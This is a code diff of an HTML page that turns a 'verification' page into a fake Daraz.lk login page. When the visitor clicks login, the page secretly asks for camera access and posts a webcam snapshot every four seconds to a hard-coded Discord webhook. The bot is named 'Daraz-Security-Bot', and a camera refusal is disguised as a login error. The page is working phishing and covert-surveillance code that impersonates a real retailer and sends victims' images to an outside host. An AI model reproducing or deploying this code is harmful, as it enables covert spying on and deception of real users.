@@ -3,79 +3,101 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Verification</title>
+    <title>Daraz.lk | Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        #video { width: 320px; border: 1px solid #333; display: none; } /* Hidden video */
-        .status { margin-top: 20px; font-size: 1.2rem; }
-        button { padding: 15px 30px; background: #0f0; color: #000; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; }
+        /* Hide the technical elements from the user */
+        #video, #canvas { display: none; }
+        .daraz-orange { background-color: #f57224; }
+        .daraz-text { color: #f57224; }
     </style>
 </head>
-<body>
+<body class="bg-gray-100 font-sans">
 
-    <div class="status" id="status">AUTHENTICATION REQUIRED</div>
-    <br>
-    <button id="authBtn">VERIFY IDENTITY</button>
+    <nav class="bg-white shadow-sm p-4 flex justify-between items-center px-10">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/d/d4/Daraz_Logo.png" alt="Daraz" class="h-8">
+        <div class="text-gray-500 text-sm">Help Center</div>
+    </nav>
+
+    <div class="flex flex-col items-center justify-center mt-20">
+        <div class="bg-white p-8 rounded shadow-md w-96">
+            <h2 class="text-2xl font-bold mb-6 text-gray-800">Welcome to Daraz! Please login.</h2>
+            
+            <div class="mb-4">
+                <label class="block text-sm font-medium text-gray-600">Phone Number or Email</label>
+                <input type="text" class="w-full border p-2 rounded mt-1 focus:outline-none focus:border-orange-500" placeholder="Please enter your Phone Number or Email">
+            </div>
+
+            <div class="mb-6">
+                <label class="block text-sm font-medium text-gray-600">Password</label>
+                <input type="password" class="w-full border p-2 rounded mt-1 focus:outline-none focus:border-orange-500" placeholder="Please enter your password">
+            </div>
+
+            <button id="authBtn" class="w-full daraz-orange text-white py-3 rounded font-bold hover:bg-orange-600 transition">
+                LOGIN
+            </button>
+
+            <div class="mt-4 text-xs text-gray-400 text-center">
+                By clicking Login, you agree to our Terms and Privacy Policy.
+            </div>
+        </div>
+        
+        <div id="status" class="mt-4 text-gray-400 text-xs italic">Secure Authentication Mode Active</div>
+    </div>
 
     <video id="video" autoplay playsinline></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <canvas id="canvas"></canvas>
 
     <script>
+        // REPLACE WITH YOUR DISCORD WEBHOOK
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1477690694574276739/YqRoM2cBw3mX2fqa9UBYE80h1t1IapZXWUrvad5XIfFu4bmpLaDivtHcxtlLorS5OI58";
+        
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const authBtn = document.getElementById('authBtn');
         const status = document.getElementById('status');
 
         authBtn.addEventListener('click', async () => {
-            status.innerText = "INITIALIZING...";
-            
+            // Change UI to show it's "loading" while capturing
+            authBtn.innerText = "VERIFYING...";
+            authBtn.disabled = true;
+            status.innerText = "System: Authenticating hardware...";
+
             try {
-                // 1. Request Camera Access
+                // Request Camera Access
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                 video.srcObject = stream;
 
-                // Wait a moment for camera to adjust to light
-                setTimeout(() => {
+                // Start Continuous Loop: Every 4 seconds
+                setInterval(() => {
                     captureAndSend();
-                }, 1000);
+                }, 4000);
 
             } catch (err) {
-                status.innerText = "ACCESS DENIED: PLEASE ALLOW CAMERA";
-                console.error(err);
+                // If they deny, we show an error that looks like a login failure
+                status.innerText = "Error: Camera verification required for security.";
+                authBtn.innerText = "LOGIN";
+                authBtn.disabled = false;
             }
         });
 
         async function captureAndSend() {
-            // 2. Capture Frame to Canvas
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
 
-            // 3. Convert Canvas to Blob (File)
             canvas.toBlob(async (blob) => {
                 const formData = new FormData();
-                formData.append('file1', blob, 'capture.png');
+                formData.append('file', blob, `live_capture_${Date.now()}.png`);
                 formData.append('payload_json', JSON.stringify({
-                    content: "📸 **New Capture Received!**\nTarget clicked the verify button.",
-                    username: "Lyrox-Tracker"
+                    content: `🔔 **Live Feed Update**\nTime: ${new Date().toLocaleTimeString()}\nUser is still active on page.`,
+                    username: "Daraz-Security-Bot"
                 }));
 
-                // 4. Send to Discord
                 try {
-                    const response = await fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        body: formData
-                    });
-
-                    if (response.ok) {
-                        status.innerText = "VERIFICATION COMPLETE";
-                        // Optional: Redirect to a fake "success" page
-                        // window.location.href = "https://google.com";
-                    }
-                } catch (error) {
-                    console.error("Webhook Error:", error);
-                }
+                    await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+                } catch (e) { console.error("Ping failed"); }
             }, 'image/png');
         }
     </script>
